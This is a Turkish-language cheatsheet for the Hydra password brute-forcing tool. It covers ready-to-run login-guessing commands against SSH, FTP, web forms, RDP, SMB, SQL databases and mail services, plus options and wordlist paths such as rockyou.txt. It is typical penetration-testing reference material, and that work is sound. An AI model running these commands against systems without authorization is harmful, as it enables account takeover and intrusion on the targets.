# Hydra Cheatsheet

## Temel Söz Dizimi

```bash
hydra [seçenekler] <hedef> <protokol>
```

## Yaygın Kullanımlar

```bash
# SSH brute force
hydra -l kullanici -P wordlist.txt ssh://192.168.1.10
hydra -L kullanicilar.txt -P wordlist.txt ssh://192.168.1.10

# FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.10

# HTTP Form POST
hydra -l admin -P wordlist.txt 192.168.1.10 http-post-form \
  "/login.php:username=^USER^&pass=^PASS^:Gecersiz kullanici"

# HTTP Form GET
hydra -l admin -P wordlist.txt 192.168.1.10 http-get-form \
  "/login.php:username=^USER^&pass=^PASS^:Gecersiz kullanici"

# HTTP Basic Auth
hydra -l admin -P wordlist.txt http-get://192.168.1.10/admin

# RDP
hydra -l administrator -P wordlist.txt rdp://192.168.1.10

# SMB
hydra -l administrator -P wordlist.txt smb://192.168.1.10

# MySQL
hydra -l root -P wordlist.txt mysql://192.168.1.10

# MSSQL
hydra -l sa -P wordlist.txt mssql://192.168.1.10

# Telnet
hydra -l admin -P wordlist.txt telnet://192.168.1.10

# SMTP
hydra -l kullanici@domain.com -P wordlist.txt smtp://mail.domain.com

# POP3
hydra -l kullanici -P wordlist.txt pop3://mail.domain.com
```

## Seçenekler

```bash
-l <kullanici>         # Tek kullanıcı adı
-L <dosya>             # Kullanıcı adı listesi
-p <parola>            # Tek parola
-P <dosya>             # Parola listesi
-C <dosya>             # user:pass formatında kombo listesi

-t <n>                 # Eş zamanlı görev sayısı (varsayılan: 16)
-T <n>                 # Toplam eş zamanlı bağlantı
-w <sn>                # Bekleme süresi (saniye)
-W <sn>                # İstekler arası bekleme

-s <port>              # Özel port
-S                     # SSL/TLS kullan

-v                     # Ayrıntılı çıktı
-V                     # Her deneme için çıktı
-d                     # Debug modu
-o <dosya>             # Sonuçları dosyaya kaydet

-f / -F                # İlk geçerli parolada dur / tüm hostlarda dur
-R                     # Önceki oturumu devam ettir
```

## Pratik Örnekler

```bash
# Aynı anda birden fazla host
hydra -L kullanicilar.txt -P wordlist.txt -M hosts.txt ssh

# Özel port
hydra -l root -P wordlist.txt -s 2222 ssh://192.168.1.10

# HTTPS form
hydra -l admin -P wordlist.txt 192.168.1.10 https-post-form \
  "/login:user=^USER^&pass=^PASS^:Access denied"

# Paralel görev sayısını azalt (throttle)
hydra -l admin -P wordlist.txt -t 4 -w 3 ssh://192.168.1.10

# Sonuçları dosyaya kaydet
hydra -l admin -P wordlist.txt -o sonuc.txt ssh://192.168.1.10
```

## Yaygın Wordlist'ler

```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/top-1000.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```
